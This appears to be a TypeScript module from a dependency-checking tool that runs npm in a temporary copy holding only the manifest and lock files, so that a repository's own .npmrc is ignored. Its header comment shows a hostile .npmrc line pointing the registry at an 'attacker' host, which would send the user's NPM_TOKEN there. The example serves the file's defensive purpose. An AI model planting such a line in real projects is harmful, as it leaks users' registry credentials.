/**
 * The directory `deps_update_plan` runs `npm outdated` in, and `deps_audit`
 * `npm audit`: a temporary copy of the project's `package.json` and lock
 * files, and nothing else.
 *
 * npm reads project configuration from the `.npmrc` beside the package it
 * works on (a workspace root's, from a member), and a repository's `.npmrc`
 * decides where npm fetches from, which of the user's credentials it sends
 * there — `registry=https://attacker/` with
 * `//attacker/:_authToken=${NPM_TOKEN}` sends the token npm expands from the
 * environment — and which program it starts for a git dependency (`git=`).
 * No flag turns project configuration off, so npm is handed a package of its
 * own: in a directory dev-guardian created outside the project, the user's
 * configuration is the only one there is. With no `node_modules` beside it,
 * npm reports no `current` version — a fresh checkout's shape, which the npm
 * runner already reads from the project's lock file. `npm audit` needs
 * nothing more: it reads the lock (measured on npm 11.20.0, 2026-10-27 — the
 * copy sent the same bulk-advisory request as the project, a workspace
 * root's members' dependencies included, and without a lock both fail
 * `ENOLOCK`, whatever `node_modules` holds).
 */

import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, relative, sep } from 'node:path';
import {
  describeReadRefusal,
  presentInProject,
  PROJECT_FILE_MAX_BYTES,
  PROJECT_LOCKFILE_MAX_BYTES,
  projectEntryKind,
  readProjectBytes,
} from '../platform/projectFs.js';

/** What npm reads to answer `outdated` for a package, besides `node_modules`. */
const COPIED: ReadonlyArray<{ name: string; maxBytes: number }> = [
  { name: 'package.json', maxBytes: PROJECT_FILE_MAX_BYTES },
  { name: 'package-lock.json', maxBytes: PROJECT_LOCKFILE_MAX_BYTES },
  { name: 'npm-shrinkwrap.json', maxBytes: PROJECT_LOCKFILE_MAX_BYTES },
];

/** The npm package configuration files a repository may carry, which the copy leaves behind. */
const NPM_PROJECT_CONFIG = ['.npmrc', '.pnpmrc', '.yarnrc', '.yarnrc.yml'] as const;

/** The nearest directory at or above `start` holding `.git` (a directory, or
 *  a worktree's `.git` file), or null when there is none. */
export function gitRootAbove(start: string): string | null {
  for (let dir = start; ; ) {
    // lstat only: `.git` is never followed to find out.
    if (projectEntryKind(join(dir, '.git')) !== 'absent') return dir;
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
}

/**
 * The repository's own npm configuration files the copy left behind, relative
 * to the project, `/`-separated — the project's directory and each above it up
 * to the repository root (a workspace root's applies to its members). Named in
 * the result so an answer from the user's registry, instead of the one a
 * committed `.npmrc` names, says so.
 */
export function npmConfigNotRead(projectPath: string): string[] {
  const top = gitRootAbove(projectPath) ?? projectPath;
  const out: string[] = [];
  for (let dir = projectPath; ; dir = dirname(dir)) {
    for (const name of NPM_PROJECT_CONFIG) {
      if (presentInProject(dir, join(dir, name))) out.push(relative(projectPath, join(dir, name)).split(sep).join('/'));
    }
    if (dir === top || dirname(dir) === dir) return out;
  }
}

type NpmPlanningCopy = { ok: true; dir: string; dispose(): void } | { ok: false; reason: string };

/** Copies the project's manifest and lock files into a new temporary directory. */
export function npmPlanningCopy(projectPath: string): NpmPlanningCopy {
  const files: Array<{ name: string; bytes: Buffer }> = [];
  for (const { name, maxBytes } of COPIED) {
    const read = readProjectBytes(projectPath, join(projectPath, name), maxBytes);
    if (read.status === 'absent') continue;
    if (read.status === 'refused') return { ok: false, reason: `${name} was not read: ${describeReadRefusal(read.reason)}` };
    files.push({ name, bytes: read.bytes });
  }
  if (!files.some((f) => f.name === 'package.json')) return { ok: false, reason: 'package.json is not a file in the project' };
  const dir = mkdtempSync(join(tmpdir(), 'guardian-npm-plan-'));
  const dispose = (): void => rmSync(dir, { recursive: true, force: true, maxRetries: 3, retryDelay: 50 });
  try {
    for (const f of files) writeFileSync(join(dir, f.name), f.bytes, { flag: 'wx' });
  } catch (e) {
    dispose();
    return { ok: false, reason: `the copy could not be written: ${e instanceof Error ? e.message : String(e)}` };
  }
  return { ok: true, dir, dispose };
}
